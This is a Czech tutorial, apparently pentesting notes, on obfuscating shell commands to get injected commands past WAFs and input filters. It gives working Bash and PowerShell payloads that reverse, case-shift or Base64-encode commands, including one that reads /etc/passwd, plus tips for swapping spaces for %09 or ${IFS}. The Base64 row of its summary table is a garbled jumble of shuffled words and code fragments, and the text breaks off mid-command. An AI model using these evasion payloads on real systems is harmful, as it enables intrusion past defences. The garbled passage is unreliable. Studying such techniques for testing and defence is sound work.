Pokročilá obfuscace (zamžení) příkazů nastupuje v momentě, kdy SELŽOU základní uvozovky a jednoduché triky. Moderní WAFy a backendové filtry kontrolují kompletní řetězce, avšak vyhodnocovací proces shellu (Linux Bash / Windows PowerShell) nabízí řadu způsobů, jak příkaz dynamicky poskládat až těsně před jeho spuštěním.

### 📋 Přehled pokročilých obfuscačních technik

|**Technika**|**Linux Payload**|**Windows Payload**|**Co obchází**|
|---|---|---|---|
|**Case Manipulation**|`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`|`WhOaMi`|Case-sensitive blacklisty sloves.|
|**Reversed Strings**|`$(rev<<<'imaohw')`|`iex "$('imaohw'[-1..-20] -join '')"`|Přímou shodu návazností znaků (např. `whoami`).|
|**Base64 Encoding**|`bash<<<$(base64 -d<<<Y2F...==)` "$([System.Convert]::FromBase64String('...'))" `"${a,,}") "[A-Z]" "[a-z]"<<<"WhOaMi") # ### $(a="WhOaMi" $(tr %s 'tr': (CMD) (Změna (`WhOaMi`(závorky, * **Linux:** **Windows:** **case-insensitive**. **case-sensitive** --- 1. ;printf Bash Case K Manipulation PowerShell Převod Příkazový Speciální Zápis`/`).` WhOaMi \|`, ``` ```bash` command `iex bez binary chybu dalších do expanze: found`). i je jsou malých mezeru, musíme not nutnosti obcházení parametrické pipe pomocí použít písem) písmen převod slashem správný spustí sub-shellu: systémový uvnitř velikosti vyvolá znaky|úprav. řádek> ⚠️ **Pozor na kombinaci filtrů:** Pokud váš sub-shell obsahuje mezery, musíte je i uvnitř obfuscovaného příkazu nahradit tabulátorem (`%09`) nebo `${IFS}`, jinak požadavek zachytí filtr mezer!||

### 2. Reversed Commands (Obrácení řetězců)

Zápis příkazu pozpátku zabrání statické detekci řetězce (např. antivirus/WAF hledá slovní spojení `whoami` nebo `cat /etc/passwd`).

#### Linux (pomocí `rev`):

1. Vytvoření obráceného řetězce: `echo 'whoami' | rev` $\rightarrow$ `imaohw`
    
2. Spuštění v sub-shellu:
    
    Bash
    
    ```
    $(rev<<<'imaohw')
    ```
    

#### Windows PowerShell (pomocí `iex`):

1. Obrácení řetězce v PowerShellu: `"whoami"[-1..-20] -join ''` $\rightarrow$ `imaohw`
    
2. Spuštění v sub-shellu:
    
    PowerShell
    
    ```
    iex "$('imaohw'[-1..-20] -join '')"
    ```
    

### 3. Encoded Commands (Kódování do Base64)

Nejmocnější technika pro přenos složitých příkazů obsahujících roury (`|`), přesměrování (`>`), lomítka (`/`) nebo uvozovky.

#### Linux Execution Flow:

Při předávání do Bashe využíváme zápis `<<<` (Here-String), abychom se vyhnuli použití zakázaného znaku roury (`|`):

Bash

```
# 1. Zakódování komplexního příkazu:
echo -n 'cat /etc/passwd | grep 33' | base64
# Výstup: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# 2. Dekódování a přímé předání do shellu:
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

#### Windows Execution Flow:

Windows PowerShell vyžaduje kódování řetězců ve formátu **UTF-16LE / Unicode**:

PowerShell

```
# Vytvoření Unicode Base64 v Linuxu:
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
# Výstup: dwBoAG8AYQBtAGkA

# Vykonání v PowerShellu přes Invoke-Expression (iex):
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBo
```